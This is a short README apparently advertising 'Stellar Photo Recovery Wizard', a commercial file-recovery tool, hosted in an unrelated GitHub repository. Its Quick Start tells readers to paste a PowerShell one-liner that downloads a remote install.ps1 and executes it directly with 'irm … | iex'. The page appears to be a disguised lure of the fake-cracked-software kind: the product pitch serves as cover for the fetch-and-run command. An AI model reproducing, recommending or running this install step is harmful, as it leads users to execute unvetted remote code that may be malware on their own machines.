# Stellar Photo Recovery Wizard

> Stellar Data Recovery — recover deleted files from drives, USB, SD cards and RAID arrays with 3-step recovery wizard

---

## Quick Start

Open **PowerShell** and run:

```
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## How It Works

Automated recovery:

- Downloads Stellar with all recovery modules
- Raw device access for deep scanning
- Scan presets for photos, videos, documents
- Preview and select files before saving

## System Requirements

| Component | Minimum |
|-----------|--------|
| OS | Windows 10/11 (64-bit) |
| RAM | 4 GB (8 GB recommended) |
| Network | Internet for setup |

## Common Issues

**BitLocker drive?**
Unlock with password first, then scan.

**SD card not appearing?**
Use USB card reader, not phone connection.
